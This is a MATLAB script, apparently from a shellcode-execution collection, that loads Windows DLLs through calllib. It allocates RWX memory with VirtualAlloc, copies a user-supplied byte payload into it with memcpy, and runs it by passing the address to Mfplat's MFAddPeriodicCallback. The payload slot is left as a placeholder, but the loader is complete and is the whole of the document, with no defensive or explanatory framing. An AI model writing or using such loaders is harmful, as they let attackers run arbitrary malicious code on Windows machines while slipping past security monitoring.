% Wra7h/FlavorTown
% MATLAB version: R2023a
% Tested on Win10 x64

if not(libisloaded('kernel32'))
    loadlibrary('kernel32.dll', @kernel32proto);
end

if not(libisloaded('Mfplat'))
    loadlibrary('Mfplat.dll', @Mfplatproto);
end

if not(libisloaded('msvcrt'))
    loadlibrary('msvcrt.dll', @msvcrtproto);
end

%payloadexample = uint8([86, 72, 137, 230,...]);
payload = uint8([PAYLOAD HERE]);
cbPayload = length(payload);

%VirtualAlloc
allocationType = bitxor(hex2dec('00001000'), hex2dec('00002000'));
protection = hex2dec('00000040');
hAlloc = calllib('kernel32', 'VirtualAlloc', [], cbPayload, allocationType, protection);

%Copy payload to RWX memory region
calllib('msvcrt', 'memcpy', hAlloc, payload, int64(cbPayload));

%Execute
MFSTARTUP_NOSOCKET = 1;
calllib('Mfplat', 'MFStartup', 131184, MFSTARTUP_NOSOCKET);

calllib('Mfplat', 'MFAddPeriodicCallback', hAlloc, [], 0);

calllib('kernel32', 'Sleep', 10000);

calllib('Mfplat', 'MFShutdown');

%Cleanup loaded libraries
if libisloaded('kernel32')
    unloadlibrary('kernel32');
end

if libisloaded('Mfplat')
    unloadlibrary('Mfplat');
end

if libisloaded('msvcrt')
    unloadlibrary('msvcrt');
end

function [fcns, structs, enuminfo] = kernel32proto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias=[];

    % Prototype for VirtualAlloc
    fcns.name{1} = 'VirtualAlloc';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'int64'; 
    fcns.RHS{1} = {'int64Ptr', 'int64', 'uint32', 'uint32'};

    fcns.name{2} = 'Sleep';
    fcns.calltype{2} = 'cdecl';
    fcns.LHS{2} = 'voidPtr'; 
    fcns.RHS{2} = {'uint32'};
end

function [fcns,structs,enuminfo] = Mfplatproto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias={};
    
    % Prototype for MFStartup
    fcns.name{1} = 'MFStartup';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'voidPtr';
    fcns.RHS{1} = {'uint64', 'int'};

    % Prototype for MFAddPeriodicCallback
    fcns.name{2} = 'MFAddPeriodicCallback';
    fcns.calltype{2} = 'cdecl';
    fcns.LHS{2} = 'voidPtr';
    fcns.RHS{2} = {'int64', 'voidPtr', 'uint32'};

    % Prototype for MFShutdown
    fcns.name{3} = 'MFShutdown';
    fcns.calltype{3} = 'cdecl';
    fcns.LHS{3} = 'voidPtr';
    fcns.RHS{3} = {};

end

function [fcns,structs,enuminfo] = msvcrtproto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias={};
    fcns.name{1} = 'memcpy';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'voidPtr'; 
    fcns.RHS{1} = {'int64', 'uint8Ptr', 'int64'};
end